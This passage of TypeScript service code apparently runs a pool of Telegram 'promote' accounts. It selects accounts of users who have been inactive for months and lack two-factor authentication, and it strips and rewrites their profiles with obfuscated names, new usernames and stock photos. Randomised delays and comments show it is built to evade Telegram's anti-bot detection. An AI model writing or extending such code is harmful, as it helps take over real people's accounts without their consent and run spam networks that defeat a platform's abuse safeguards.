reasons.push('Username update needed');\n\n        // Profile photos - needs username done at least 1 day ago, 170+ channels\n        const usernameDone = usernameTimestamp > 0 && (now - usernameTimestamp >= MIN_DAYS_BETWEEN_UPDATES);\n        const profilePicsTimestamp = ClientHelperUtils.getTimestamp(doc.profilePicsUpdatedAt);\n        const needsProfilePhotos = accountAge >= 10 * DAY && accountAge <= 30 * DAY &&\n            (doc.channels || 0) > 170 &&\n            (profilePicsTimestamp === 0 || profilePicsTimestamp < now - 30 * DAY) &&\n            (usernameDone || usernameTimestamp === 0);\n        if (needsProfilePhotos) reasons.push('Profile photos update needed');\n\n        const totalPending = [needsPrivacy, needsDeletePhotos, needsNameBio, needsUsername, needsProfilePhotos]\n            .filter(Boolean).length;\n\n        return {\n            needsPrivacy,\n            needsDeletePhotos,\n            needsNameBio,\n            needsUsername,\n            needsProfilePhotos,\n            totalPending,\n            reasons\n        };\n    }\n\n    /**\n     * Update privacy settings for a promote client\n     */\n    private async updatePrivacySettings(doc: PromoteClient, client: Client, failedAttempts: number): Promise<number> {\n        const telegramClient = await connectionManager.getClient(doc.mobile, { autoDisconnect: true, handler: false });\n        try {\n            await sleep(5000 + Math.random() * 5000);\n            await telegramClient.updatePrivacyforDeletedAccount();\n            await this.update(doc.mobile, {\n                privacyUpdatedAt: new Date(),\n                lastUpdateAttempt: new Date(),\n                failedUpdateAttempts: 0,\n                lastUpdateFailure: null\n            });\n            this.logger.debug(`Updated privacy settings for ${doc.mobile}`);\n            await sleep(30000 + Math.random() * 20000);\n            return 1;\n        } catch (error: unknown) {\n            const errorDetails = this.handleError(error, 'Error updating privacy', doc.mobile);\n            await this.update(doc.mobile, {\n                lastUpdateAttempt: new Date(),\n                failedUpdateAttempts: failedAttempts + 1,\n                lastUpdateFailure: new Date()\n            });\n            if (isPermanentError(errorDetails)) {\n                await this.markAsInactive(doc.mobile, errorDetails.message);\n            }\n            return 0;\n        } finally {\n            await this.safeUnregisterClient(doc.mobile);\n        }\n    }\n\n    /**\n     * Delete profile photos for a promote client\n     */\n    private async deleteProfilePhotos(doc: PromoteClient, client: Client, failedAttempts: number): Promise<number> {\n        const telegramClient = await connectionManager.getClient(doc.mobile, { autoDisconnect: true, handler: false });\n        try {\n            await sleep(5000 + Math.random() * 5000);\n            const photos = await telegramClient.client.invoke(new Api.photos.GetUserPhotos({ userId: 'me', offset: 0 }));\n\n            if (photos.photos.length > 0) {\n                await telegramClient.deleteProfilePhotos();\n                this.logger.debug(`Deleted ${photos.photos.length} profile photos for ${doc.mobile}`);\n            } else {\n                this.logger.debug(`No profile photos to delete for ${doc.mobile}`);\n            }\n\n            await this.update(doc.mobile, {\n                profilePicsDeletedAt: new Date(),\n                lastUpdateAttempt: new Date(),\n                failedUpdateAttempts: 0,\n                lastUpdateFailure: null\n            });\n            await sleep(30000 + Math.random() * 20000);\n            return photos.photos.length > 0 ? 1 : 0;\n        } catch (error: unknown) {\n            const errorDetails = this.handleError(error, 'Error deleting photos', doc.mobile);\n            await this.update(doc.mobile, {\n                lastUpdateAttempt: new Date(),\n                failedUpdateAttempts: failedAttempts + 1,\n                lastUpdateFailure: new Date()\n            });\n            if (isPermanentError(errorDetails)) {\n                await this.markAsInactive(doc.mobile, errorDetails.message);\n            }\n            return 0;\n        } finally {\n            await this.safeUnregisterClient(doc.mobile);\n        }\n    }\n\n    /**\n     * Update name and bio for a promote client\n     */\n    private async updateNameAndBio(doc: PromoteClient, client: Client, failedAttempts: number): Promise<number> {\n        const telegramClient = await connectionManager.getClient(doc.mobile, { autoDisconnect: true, handler: false });\n        try {\n            await sleep(5000 + Math.random() * 5000);\n            const me = await telegramClient.getMe();\n            await sleep(5000 + Math.random() * 5000);\n\n            let updateCount = 0;\n            const expectedName = client?.name.split(' ')[0];\n            if (!isIncludedWithTolerance(safeAttemptReverse(me?.firstName), expectedName, 2)) {\n                this.logger.log(`Updating first name for ${doc.mobile} from ${me.firstName} to ${client.name}`);\n                await telegramClient.updateProfile(\n                    `${obfuscateText(`${expectedName} ${getRandomPetName()}`, {\n                        maintainFormatting: false,\n                        preserveCase: true,\n                        useInvisibleChars: false\n                    })} ${getCuteEmoji()}`,\n                    ''\n                );\n                updateCount = 1;\n            }\n\n            await this.update(doc.mobile, {\n                nameBioUpdatedAt: new Date(),\n                lastUpdateAttempt: new Date(),\n                failedUpdateAttempts: 0,\n                lastUpdateFailure: null\n            });\n            this.logger.debug(`Updated name and bio for ${doc.mobile}`);\n            await sleep(30000 + Math.random() * 20000);\n            return updateCount;\n        } catch (error: unknown) {\n            const errorDetails = this.handleError(error, 'Error updating profile', doc.mobile);\n            await this.update(doc.mobile, {\n                lastUpdateAttempt: new Date(),\n                failedUpdateAttempts: failedAttempts + 1,\n                lastUpdateFailure: new Date()\n            });\n            if (isPermanentError(errorDetails)) {\n                await this.markAsInactive(doc.mobile, errorDetails.message);\n            }\n            return 0;\n        } finally {\n            await this.safeUnregisterClient(doc.mobile);\n        }\n    }\n\n    /**\n     * Update username for a promote client\n     */\n    private async updateUsername(doc: PromoteClient, client: Client, failedAttempts: number): Promise<number> {\n        const telegramClient = await connectionManager.getClient(doc.mobile, { autoDisconnect: true, handler: false });\n        try {\n            await sleep(5000 + Math.random() * 5000);\n            await this.telegramService.updateUsername(doc.mobile, '');\n            await this.update(doc.mobile, {\n                usernameUpdatedAt: new Date(),\n                lastUpdateAttempt: new Date(),\n                failedUpdateAttempts: 0,\n                lastUpdateFailure: null\n            });\n            this.logger.debug(`Updated username for ${doc.mobile}`);\n            await sleep(30000 + Math.random() * 20000);\n            return 1;\n        } catch (error: unknown) {\n            const errorDetails = this.handleError(error, 'Error updating username', doc.mobile);\n            await this.update(doc.mobile, {\n                lastUpdateAttempt: new Date(),\n                failedUpdateAttempts: failedAttempts + 1,\n                lastUpdateFailure: new Date()\n            });\n            if (isPermanentError(errorDetails)) {\n                await this.markAsInactive(doc.mobile, errorDetails.message);\n            }\n            return 0;\n        } finally {\n            await this.safeUnregisterClient(doc.mobile);\n        }\n    }\n\n    /**\n     * Update profile photos for a promote client\n     */\n    private async updateProfilePhotos(doc: PromoteClient, client: Client, failedAttempts: number): Promise<number> {\n        const telegramClient = await connectionManager.getClient(doc.mobile, { autoDisconnect: true, handler: false });\n        try {\n            await sleep(5000 + Math.random() * 5000);\n            const photos = await telegramClient.client.invoke(new Api.photos.GetUserPhotos({ userId: 'me', offset: 0 }));\n\n            let updateCount = 0;\n            if (photos.photos.length < 2) {\n                await CloudinaryService.getInstance(client?.dbcoll?.toLowerCase());\n                await sleep(10000 + Math.random() * 5000);\n\n                // CRITICAL: Only add ONE photo per cycle to avoid triggering anti-bot\n                const shuffle = <T>(arr: T[]): T[] => {\n                    const a = arr.slice();\n                    for (let i = a.length - 1; i > 0; i--) {\n                        const j = Math.floor(Math.random() * (i + 1));\n                        [a[i], a[j]] = [a[j], a[i]];\n                    }\n                    return a;\n                };\n\n                const photoPaths = shuffle(['dp1.jpg', 'dp2.jpg', 'dp3.jpg']);\n                const randomPhoto = photoPaths[0]; // Only use first photo\n                await telegramClient.updateProfilePic(path.join(process.cwd(), randomPhoto));\n                updateCount = 1;\n                this.logger.debug(`Updated profile photo ${randomPhoto} for ${doc.mobile} (1 of ${photoPaths.length} photos)`);\n            }\n\n            await this.update(doc.mobile, {\n                profilePicsUpdatedAt: new Date(),\n                lastUpdateAttempt: new Date(),\n                failedUpdateAttempts: 0,\n                lastUpdateFailure: null\n            });\n            await sleep(40000 + Math.random() * 20000);\n            return updateCount;\n        } catch (error: unknown) {\n            const errorDetails = this.handleError(error, 'Error updating profile photos', doc.mobile);\n            await this.update(doc.mobile, {\n                lastUpdateAttempt: new Date(),\n                failedUpdateAttempts: failedAttempts + 1,\n                lastUpdateFailure: new Date()\n            });\n            if (isPermanentError(errorDetails)) {\n                await this.markAsInactive(doc.mobile, errorDetails.message);\n            }\n            return 0;\n        } finally {\n            await this.safeUnregisterClient(doc.mobile);\n        }\n    }\n\n    async processPromoteClient(doc: PromoteClient, client: Client): Promise<number> {\n        if (!client) {\n            this.logger.warn(`Client not found for promote client ${doc.mobile}`);\n            return 0;\n        }\n\n        const MIN_COOLDOWN_HOURS = 2;\n        const MAX_FAILED_ATTEMPTS = 3; // Skip after 3 consecutive failures\n        const FAILURE_RESET_DAYS = 7; // Reset failure count after 7 days\n        const now = Date.now();\n        let updateCount = 0;\n\n        try {\n            await sleep(15000 + Math.random() * 10000); // 15-25s initial delay\n\n            // Check if client has too many failed attempts\n            const failedAttempts = doc.failedUpdateAttempts || 0;\n            const lastFailureTime = ClientHelperUtils.getTimestamp(doc.lastUpdateFailure);\n\n            // Reset failure count if last failure was more than FAILURE_RESET_DAYS ago\n            if (failedAttempts > 0 && lastFailureTime > 0 && now - lastFailureTime > FAILURE_RESET_DAYS * this.ONE_DAY_MS) {\n                this.logger.log(`Resetting failure count for ${doc.mobile} (last failure was ${Math.floor((now - lastFailureTime) / this.ONE_DAY_MS)} days ago)`);\n                await this.update(doc.mobile, {\n                    failedUpdateAttempts: 0,\n                    lastUpdateFailure: null\n                });\n            } else if (failedAttempts >= MAX_FAILED_ATTEMPTS) {\n                this.logger.warn(`Skipping ${doc.mobile} - too many failed attempts (${failedAttempts}). Will retry after ${FAILURE_RESET_DAYS} days.`);\n                return 0;\n            }\n\n            // Check cooldown\n            const lastUpdateAttempt = ClientHelperUtils.getTimestamp(doc.lastUpdateAttempt);\n            if (lastUpdateAttempt > 0 && now - lastUpdateAttempt < MIN_COOLDOWN_HOURS * 60 * 60 * 1000) {\n                const hoursRemaining = ((MIN_COOLDOWN_HOURS * 60 * 60 * 1000) - (now - lastUpdateAttempt)) / (60 * 60 * 1000);\n                this.logger.debug(`Client ${doc.mobile} on cooldown, ${hoursRemaining.toFixed(1)} hours remaining`);\n                return 0;\n            }\n\n            // Check if recently used (skip if has updates)\n            const lastUsed = ClientHelperUtils.getTimestamp(doc.lastUsed);\n            const hasAnyUpdate = !!(doc.privacyUpdatedAt || doc.profilePicsDeletedAt || doc.nameBioUpdatedAt ||\n                doc.usernameUpdatedAt || doc.profilePicsUpdatedAt);\n            if (hasAnyUpdate && lastUsed > 0 && now - lastUsed < MIN_COOLDOWN_HOURS * 60 * 60 * 1000) {\n                this.logger.debug(`Client ${doc.mobile} recently used, skipping`);\n                return 0;\n            }\n\n            // Skip accounts older than 30 days\n            const accountAge = doc.createdAt ? now - new Date(doc.createdAt).getTime() : 0;\n            if (accountAge > 30 * this.ONE_DAY_MS) {\n                this.logger.debug(`Client ${doc.mobile} is older than 30 days, skipping`);\n                return 0;\n            }\n\n            // Backfill timestamps for used clients\n            if (lastUsed > 0) {\n                await this.backfillTimestamps(doc.mobile, doc, now);\n                this.logger.debug(`Client ${doc.mobile} has been used, assuming configured`);\n                return 0;\n            }\n\n            // Check pending updates\n            const pendingUpdates = this.getPendingUpdates(doc, now);\n            if (pendingUpdates.totalPending > 0) {\n                this.logger.debug(`Client ${doc.mobile} has ${pendingUpdates.totalPending} pending updates: ${pendingUpdates.reasons.join(', ')}`);\n            } else {\n                this.logger.debug(`Client ${doc.mobile} has no pending updates - all complete!`);\n            }\n\n            // PRIORITY 1: Privacy update\n            if (pendingUpdates.needsPrivacy) {\n                updateCount = await this.updatePrivacySettings(doc, client, failedAttempts);\n                return updateCount;\n            }\n\n            // PRIORITY 2: Delete profile photos\n            if (pendingUpdates.needsDeletePhotos) {\n                updateCount = await this.deleteProfilePhotos(doc, client, failedAttempts);\n                return updateCount;\n            }\n\n            // PRIORITY 3: Update name and bio\n            if (pendingUpdates.needsNameBio) {\n                updateCount = await this.updateNameAndBio(doc, client, failedAttempts);\n                return updateCount;\n            }\n\n            // PRIORITY 4: Update username\n            if (pendingUpdates.needsUsername) {\n                updateCount = await this.updateUsername(doc, client, failedAttempts);\n                return updateCount;\n            }\n\n            // PRIORITY 5: Add profile photos\n            if (pendingUpdates.needsProfilePhotos) {\n                updateCount = await this.updateProfilePhotos(doc, client, failedAttempts);\n                return updateCount;\n            }\n\n            // If no updates were performed, still track the attempt to prevent rapid retries\n            if (updateCount === 0) {\n                await this.update(doc.mobile, { lastUpdateAttempt: new Date() } as UpdatePromoteClientDto);\n                // Log why no updates were performed\n                if (pendingUpdates.totalPending > 0) {\n                    this.logger.debug(`No updates performed for ${doc.mobile} despite ${pendingUpdates.totalPending} pending updates. Reasons: ${pendingUpdates.reasons.join(', ')}`);\n                }\n            } else {\n                // Log remaining pending updates after this update\n                const remainingPending = pendingUpdates.totalPending - updateCount;\n                if (remainingPending > 0) {\n                    this.logger.debug(`Client ${doc.mobile} still has ${remainingPending} pending updates remaining`);\n                } else {\n                    this.logger.log(` Client ${doc.mobile} - ALL UPDATES COMPLETE! Ready for use.`);\n                }\n            }\n\n            return updateCount; // Return number of updates performed\n        } catch (error: any) {\n            const errorDetails = this.handleError(error, 'Error with client', doc.mobile);\n            // Track attempt even on error\n            try {\n                await this.update(doc.mobile, { lastUpdateAttempt: new Date() } as UpdatePromoteClientDto);\n            } catch (updateError) {\n                this.logger.warn(`Failed to track update attempt for ${doc.mobile}:`, updateError);\n            }\n            if (isPermanentError(errorDetails)) {\n                await this.markAsInactive(doc.mobile, `${errorDetails.message}`);\n            }\n            return 0; // Return 0 on error\n        } finally {\n            await sleep(15000 + Math.random() * 10000); // 15-25s final delay (increased)\n        }\n    }\n\n    async checkPromoteClients() {\n        if (this.telegramService.getActiveClientSetup()) {\n            this.logger.warn('Ignored active check promote channels as active client setup exists');\n            return;\n        }\n        this.logger.log('Starting promote client check process');\n\n        const clients = await this.clientService.findAll();\n        const bufferClients = await this.bufferClientService.findAll();\n\n        const clientMainMobiles = clients.map((c) => c.mobile);\n        const bufferClientIds = bufferClients.map((c) => c.mobile);\n        const assignedPromoteMobiles = await this.promoteClientModel\n            .find({ clientId: { $exists: true }, status: 'active' })\n            .distinct('mobile');\n\n        const goodIds = [...clientMainMobiles, ...bufferClientIds, ...assignedPromoteMobiles].filter(Boolean);\n\n        const promoteClientCounts = await this.promoteClientModel.aggregate([\n            {\n                $match: {\n                    clientId: { $exists: true, $ne: null },\n                    status: 'active',\n                },\n            },\n            {\n                $group: {\n                    _id: '$clientId',\n                    count: { $sum: 1 },\n                    mobiles: { $push: '$mobile' },\n                },\n            },\n        ]);\n\n        const promoteClientsPerClient = new Map<string, number>(\n            promoteClientCounts.map((result: { _id: string; count: number }) => [result._id, result.count]),\n        );\n\n        let totalUpdates = 0;\n        const MIN_COOLDOWN_HOURS = 4; // Same cooldown as in processPromoteClient\n        const now = Date.now();\n\n        for (const result of promoteClientCounts) {\n            // promoteClientsPerClient is already populated from the aggregation above, no need to set again\n            if (totalUpdates < 5) {\n                for (const promoteClientMobile of result.mobiles) {\n                    const promoteClient = await this.findOne(promoteClientMobile, false);\n                    if (!promoteClient) {\n                        this.logger.warn(`Promote client ${promoteClientMobile} not found, skipping`);\n                        continue;\n                    }\n\n                    // Check cooldown before processing - handle missing field safely\n                    let lastUpdateAttempt = 0;\n                    try {\n                        lastUpdateAttempt = promoteClient.lastUpdateAttempt\n                            ? new Date(promoteClient.lastUpdateAttempt).getTime()\n                            : 0;\n                    } catch (error) {\n                        lastUpdateAttempt = 0;\n                    }\n                    if (lastUpdateAttempt > 0 && now - lastUpdateAttempt < MIN_COOLDOWN_HOURS * 60 * 60 * 1000) {\n                        const hoursRemaining = ((MIN_COOLDOWN_HOURS * 60 * 60 * 1000) - (now - lastUpdateAttempt)) / (60 * 60 * 1000);\n                        this.logger.debug(`Skipping ${promoteClientMobile} - on cooldown, ${hoursRemaining.toFixed(1)} hours remaining`);\n                        continue;\n                    }\n\n                    // Health check: verify client is still alive (check every 7 days)\n                    const lastChecked = promoteClient.lastChecked \n                        ? new Date(promoteClient.lastChecked).getTime() \n                        : 0;\n                    const healthCheckPassed = await this.performHealthCheck(promoteClientMobile, lastChecked, now);\n                    if (!healthCheckPassed) {\n                        continue; // Skip to next client if health check failed permanently\n                    }\n\n                    // If lastUsed exists, client has been used for promotion and should be fully configured\n                    // Backfill missing timestamp fields if needed, then skip (updates were done manually)\n                    const hasBeenUsed = promoteClient.lastUsed && new Date(promoteClient.lastUsed).getTime() > 0;\n                    if (hasBeenUsed) {\n                        const needsBackfill = !promoteClient.privacyUpdatedAt || !promoteClient.profilePicsDeletedAt ||\n                            !promoteClient.nameBioUpdatedAt || !promoteClient.usernameUpdatedAt ||\n                            !promoteClient.profilePicsUpdatedAt;\n\n                        if (needsBackfill) {\n                            await this.backfillTimestamps(promoteClientMobile, promoteClient, now);\n                        }\n\n                        // Always skip if lastUsed exists (updates were done manually)\n                        this.logger.debug(`Skipping ${promoteClientMobile} - already used, timestamps backfilled`);\n                        continue;\n                    }\n\n                    // Check if client needs any updates\n                    const pendingUpdates = this.getPendingUpdates(promoteClient, now);\n                    if (pendingUpdates.totalPending > 0) {\n                        const client = clients.find((c) => c.clientId === result._id);\n                        if (!client) {\n                            this.logger.warn(`Client with ID ${result._id} not found, skipping promote client ${promoteClientMobile}`);\n                            continue;\n                        }\n                        const currentUpdates = await this.processPromoteClient(promoteClient, client);\n                        this.logger.debug(`Processed promote client ${promoteClientMobile}, updates made: ${currentUpdates} | total updates so far: ${totalUpdates}`);\n                        if (currentUpdates > 0) {\n                            totalUpdates += currentUpdates;\n                        }\n                        this.logger.log(`Processed promote client ${promoteClientMobile}, updates made: ${currentUpdates} | total updates so far: ${totalUpdates}`);\n                        if (totalUpdates >= 5) {\n                            this.logger.warn('Reached total update limit of 5 for this check cycle');\n                            break;\n                        }\n                    }\n                }\n            } else {\n                this.logger.warn(`Skipping promote client ${result.mobiles.join(', ')} as total updates reached 5`);\n            }\n        }\n\n        // NEW: Calculate availability-based needs for each client (dynamic, no hard limit)\n        const clientNeedingPromoteClients: Array<{\n            clientId: string;\n            totalNeeded: number;\n            windowNeeds: Array<{ window: string; available: number; needed: number; targetDate: string; minRequired: number }>;\n            totalActive: number;\n            totalNeededForCount: number;\n            calculationReason: string;\n            priority: number;\n        }> = [];\n\n        for (const client of clients) {\n            const availabilityNeeds = await this.calculateAvailabilityBasedNeeds(client.clientId);\n\n            if (availabilityNeeds.totalNeeded > 0) {\n                clientNeedingPromoteClients.push({\n                    clientId: client.clientId,\n                    ...availabilityNeeds\n                });\n            }\n        }\n\n        // Sort by priority (most urgent first: today=0, tomorrow=1, oneWeek=7, tenDays=10, countOnly=100)\n        clientNeedingPromoteClients.sort((a, b) => a.priority - b.priority);\n\n        // Calculate total slots needed (rate-limited per trigger, but no per-client limit)\n        let totalSlotsNeeded = 0;\n        const clientNeedsMap = new Map<string, number>();\n\n        for (const clientNeed of clientNeedingPromoteClients) {\n            // No per-client limit check - only global rate limit per trigger\n            const allocated = Math.min(\n                clientNeed.totalNeeded,\n                this.MAX_NEW_PROMOTE_CLIENTS_PER_TRIGGER - totalSlotsNeeded\n            );\n            if (allocated > 0) {\n                clientNeedsMap.set(clientNeed.clientId, allocated);\n                totalSlotsNeeded += allocated;\n            }\n            if (totalSlotsNeeded >= this.MAX_NEW_PROMOTE_CLIENTS_PER_TRIGGER) break;\n        }\n\n        // Enhanced logging to show availability status\n        this.logger.debug(`Availability-based needs calculated (NO HARD LIMIT):`);\n        clientNeedingPromoteClients.forEach(need => {\n            this.logger.debug(\n                `Client ${need.clientId} (priority: ${need.priority}): ` +\n                `${need.totalActive} total active, ${need.totalNeeded} new needed - ${need.calculationReason}`\n            );\n            need.windowNeeds.forEach(window => {\n                if (window.needed > 0) {\n                    this.logger.debug(\n                        `  - ${window.window} (${window.targetDate}): ` +\n                        `${window.available} available, ${window.needed} needed ` +\n                        `(target: ${window.minRequired} per window)`\n                    );\n                } else {\n                    this.logger.debug(\n                        `  - ${window.window} (${window.targetDate}): ` +\n                        `${window.available} available  (sufficient, target: ${window.minRequired})`\n                    );\n                }\n            });\n        });\n\n        const totalActivePromoteClients = await this.promoteClientModel.countDocuments({ status: 'active' });\n        this.logger.debug(`Total active promote clients: ${totalActivePromoteClients}`);\n        this.logger.debug(`Total slots needed: ${totalSlotsNeeded} (limited to max ${this.MAX_NEW_PROMOTE_CLIENTS_PER_TRIGGER} per trigger)`);\n\n        // Build notification message\n        const clientNeedsSummary = clientNeedingPromoteClients\n            .map(c => `${c.clientId}: ${c.totalNeeded} (${c.calculationReason})`)\n            .join('\\n');\n        \n        await fetchWithTimeout(`${notifbot()}&text=${encodeURIComponent(`Promote Client Check (Dynamic Availability):\\n\\nTotal Active Promote Clients: ${totalActivePromoteClients}\\nPromote Clients Per Client: ${JSON.stringify(Object.fromEntries(promoteClientsPerClient))}\\n\\nClients Needing Promote Clients:\\n${clientNeedsSummary || 'None'}\\n\\nTotal Slots Needed: ${totalSlotsNeeded}`)}`);\n\n        if (clientNeedingPromoteClients.length > 0 && totalSlotsNeeded > 0) {\n            await this.addNewUserstoPromoteClientsDynamic(\n                [],\n                goodIds,\n                clientNeedingPromoteClients,\n                promoteClientsPerClient\n            );\n        } else {\n            this.logger.debug('No new promote clients needed - all availability windows and total count satisfied');\n        }\n    }\n\n    /**\n     * Add new users to promote clients pool\n     * Legacy method - now uses dynamic availability-based calculation internally\n     * Maintains backward compatibility with existing API calls\n     * \n     * @param badIds - Mobile numbers to exclude from selection\n     * @param goodIds - Mobile numbers already in use (active clients, buffer clients, assigned promote clients)\n     * @param clientsNeedingPromoteClients - Array of client IDs that need more promote clients\n     * @param promoteClientsPerClient - Optional map of current promote client counts per client\n     */\n    async addNewUserstoPromoteClients(\n        badIds: string[],\n        goodIds: string[],\n        clientsNeedingPromoteClients: string[] = [],\n        promoteClientsPerClient?: Map<string, number>,\n    ) {\n        // Convert legacy format to dynamic format\n        const clientNeedingPromoteClientsDynamic: Array<{\n            clientId: string;\n            totalNeeded: number;\n            windowNeeds: Array<{ window: string; available: number; needed: number; targetDate: string; minRequired: number }>;\n            totalActive: number;\n            totalNeededForCount: number;\n            calculationReason: string;\n            priority: number;\n        }> = [];\n\n        // Calculate needs for each client using dynamic calculation\n        for (const clientId of clientsNeedingPromoteClients) {\n            const availabilityNeeds = await this.calculateAvailabilityBasedNeeds(clientId);\n            if (availabilityNeeds.totalNeeded > 0) {\n                clientNeedingPromoteClientsDynamic.push({\n                    clientId,\n                    ...availabilityNeeds\n                });\n            }\n        }\n\n        // Sort by priority (most urgent first)\n        clientNeedingPromoteClientsDynamic.sort((a, b) => a.priority - b.priority);\n\n        // Call dynamic method\n        await this.addNewUserstoPromoteClientsDynamic(\n            badIds,\n            goodIds,\n            clientNeedingPromoteClientsDynamic,\n            promoteClientsPerClient\n        );\n    }\n\n    /**\n     * Add new users to promote clients pool using dynamic availability-based assignment\n     * All new promote clients get availableDate = today (available immediately)\n     * Prioritizes by urgency (today > tomorrow > 1 week > 10 days > count only)\n     * \n     * @param badIds - Mobile numbers to exclude from selection\n     * @param goodIds - Mobile numbers already in use (active clients, buffer clients, assigned promote clients)\n     * @param clientsNeedingPromoteClients - Array of client needs with priority and window details\n     * @param promoteClientsPerClient - Optional map of current promote client counts per client (for reference)\n     */\n    async addNewUserstoPromoteClientsDynamic(\n        badIds: string[],\n        goodIds: string[],\n        clientsNeedingPromoteClients: Array<{\n            clientId: string;\n            totalNeeded: number;\n            windowNeeds: Array<{ window: string; available: number; needed: number; targetDate: string; minRequired: number }>;\n            totalActive: number;\n            totalNeededForCount: number;\n            calculationReason: string;\n            priority: number;\n        }>,\n        promoteClientsPerClient?: Map<string, number>,\n    ) {\n        const threeMonthsAgo = ClientHelperUtils.getDateStringDaysAgo(this.INACTIVE_USER_CUTOFF_DAYS, this.ONE_DAY_MS);\n\n        // Calculate total needed (already sorted by priority)\n        let totalNeeded = 0;\n        for (const clientNeed of clientsNeedingPromoteClients) {\n            totalNeeded += clientNeed.totalNeeded;\n        }\n        // Only global rate limit applies\n        totalNeeded = Math.min(totalNeeded, this.MAX_NEW_PROMOTE_CLIENTS_PER_TRIGGER);\n\n        if (totalNeeded === 0) {\n            this.logger.debug('No promote clients needed - all availability windows and total count satisfied');\n            return;\n        }\n\n        this.logger.debug(\n            `Creating ${totalNeeded} new promote clients (all with availableDate = today) ` +\n            `to satisfy availability windows and total count requirements`\n        );\n\n        // Fetch candidate users\n        const documents = await this.usersService.executeQuery(\n            {\n                mobile: { $nin: goodIds },\n                expired: false,\n                twoFA: false,\n                lastActive: { $lt: threeMonthsAgo },\n                totalChats: { $gt: 150 },\n            },\n            { tgId: 1 },\n            totalNeeded + 5, // Buffer for failures\n        );\n\n        // Create assignment queue - prioritize by client priority (already sorted)\n        // All new clients get availableDate = today\n        const today = ClientHelperUtils.getTodayDateString();\n        const assignmentQueue: Array<{\n            clientId: string;\n            priority: number;\n        }> = [];\n\n        for (const clientNeed of clientsNeedingPromoteClients) {\n            // Create assignments for each needed promote client\n            // All get availableDate = today (they'll be available immediately)\n            for (let i = 0; i < clientNeed.totalNeeded; i++) {\n                assignmentQueue.push({\n                    clientId: clientNeed.clientId,\n                    priority: clientNeed.priority\n                });\n            }\n        }\n\n        let processedCount = 0;\n        let assignmentIndex = 0;\n\n        while (\n            processedCount < totalNeeded &&\n            documents.length > 0 &&\n            assignmentIndex < assignmentQueue.length\n        ) {\n            const document = documents.shift();\n            if (!document || !document.mobile || !document.tgId) {\n                this.logger.warn('Invalid document found, skipping');\n                continue;\n            }\n\n            const assignment = assignmentQueue[assignmentIndex];\n            if (!assignment) {\n                this.logger.debug('No more assignments needed');\n                break;\n            }\n\n            try {\n                // All new promote clients get availableDate = today\n                const created = await this.createPromoteClientFromUser(\n                    document,\n                    assignment.clientId,\n                    today // Always today - they'll be available immediately\n                );\n\n                if (created) {\n                    assignmentIndex++;\n                    processedCount++;\n                    this.logger.debug(\n                        `Created promote client ${document.mobile} for ${assignment.clientId} ` +\n                        `with availableDate = ${today} (available immediately, priority: ${assignment.priority})`\n                    );\n                } else {\n                    processedCount++; // Failed but increment to avoid infinite loop\n                }\n            } catch (error: unknown) {\n                const errorDetails = this.handleError(error, 'Error creating client connection', document.mobile);\n                this.logger.error(`Error creating connection for ${document.mobile}:`, errorDetails);\n                await sleep(10000 + Math.random() * 5000);\n                processedCount++;\n            }\n        }\n\n        this.logger.log(\n            ` Dynamic batch completed: Created ${processedCount} new promote clients ` +\n            `(all with availableDate = ${today}, available immediately). ` +\n            `System maintains availability windows and total count requirements.`\n        );\n    }\n\n    private clearAllTimeouts(): void {\n        this.activeTimeouts.forEach((timeout) => clearTimeout(timeout));\n        this.activeTimeouts.clear();\n        this.logger.debug('Cleared all active timeouts');\n    }\n\n    private async cleanup(): Promise<void> {\n        try {\n            this.clearAllTimeouts();\n            this.clearMemoryCleanup();\n            this.clearJoinChannelInterval();\n            this.clearLeaveChannelInterval();\n            this.clearPromoteMap();\n            this.clearLeaveMap();\n            this.isJoinChannelProcessing = false;\n            this.isLeaveChannelProcessing = false;\n        } catch (error) {\n            this.logger.error('Error during cleanup:', error);\n        }\n    }\n\n    async onModuleDestroy() {\n        await this.cleanup();\n    }\n\n    async getPromoteClientDistribution(): Promise<{\n        totalPromoteClients: number;\n        unassignedPromoteClients: number;\n        activePromoteClients: number;\n        inactivePromoteClients: number;\n        distributionPerClient: Array<{\n            clientId: string;\n            assignedCount: number;\n            activeCount: number;\n            inactiveCount: number;\n            needed: number;\n            status: 'sufficient' | 'needs_more';\n            neverUsed: number;\n            usedInLast24Hours: number;\n        }>;\n        summary: {\n            clientsWithSufficientPromoteClients: number;\n            clientsNeedingPromoteClients: number;\n            totalPromoteClientsNeeded: number;\n            maxPromoteClientsPerTrigger: number;\n            triggersNeededToSatisfyAll: number;\n        };\n    }> {\n        const clients = await this.clientService.findAll();\n\n        const now = new Date();\n        const last24Hours = new Date(now.getTime() - this.ONE_DAY_MS);\n\n        const [\n            totalPromoteClients,\n            unassignedPromoteClients,\n            activePromoteClients,\n            inactivePromoteClients,\n            assignedCounts,\n            activeCounts,\n            inactiveCounts,\n            neverUsedCounts,\n            recentlyUsedCounts,\n        ] = await Promise.all([\n            this.promoteClientModel.countDocuments({}),\n            this.promoteClientModel.countDocuments({ clientId: { $exists: false } }),\n            this.promoteClientModel.countDocuments({ status: 'active' }),\n            this.promoteClientModel.countDocuments({ status: 'inactive' }),\n            this.promoteClientModel.aggregate([\n                { $match: { clientId: { $exists: true, $ne: null } } },\n                { $group: { _id: '$clientId', count: { $sum: 1 } } },\n            ]),\n            this.promoteClientModel.aggregate([\n                { $match: { clientId: { $exists: true, $ne: null }, status: 'active' } },\n                { $group: { _id: '$clientId', count: { $sum: 1 } } },\n            ]),\n            this.promoteClientModel.aggregate([\n                { $match: { clientId: { $exists: true, $ne: null }, status: 'inactive' } },\n                { $group: { _id: '$clientId', count: { $sum: 1 } } },\n            ]),\n            this.promoteClientModel.aggregate([\n                {\n                    $match: {\n                        clientId: { $exists: true, $ne: null },\n                        status: 'active',\n                        $or: [{ lastUsed: { $exists: false } }, { lastUsed: null }],\n                    },\n                },\n                { $group: { _id: '$clientId', count: { $sum: 1 } } },\n            ]),\n            this.promoteClientModel.aggregate([\n                {\n                    $match: {\n                        clientId: { $exists: true, $ne: null },\n                        status: 'active',\n                        lastUsed: { $gte: last24Hours },\n                    },\n                },\n                { $group: { _id: '$clientId', count: { $sum: 1 } } },\n            ]),\n        ]);\n\n        const assignedCountMap = new Map(assignedCounts.map((item: { _id: string; count: number }) => [item._id, item.count]));\n        const activeCountMap = new Map(activeCounts.map((item: { _id: string; count: number }) => [item._id, item.count]));\n        const inactiveCountMap = new Map(inactiveCounts.map((item: { _id: string; count: number }) => [item._id, item.count]));\n        const neverUsedCountMap = new Map(neverUsedCounts.map((item: { _id: string; count: number }) => [item._id, item.count]));\n        const recentlyUsedCountMap = new 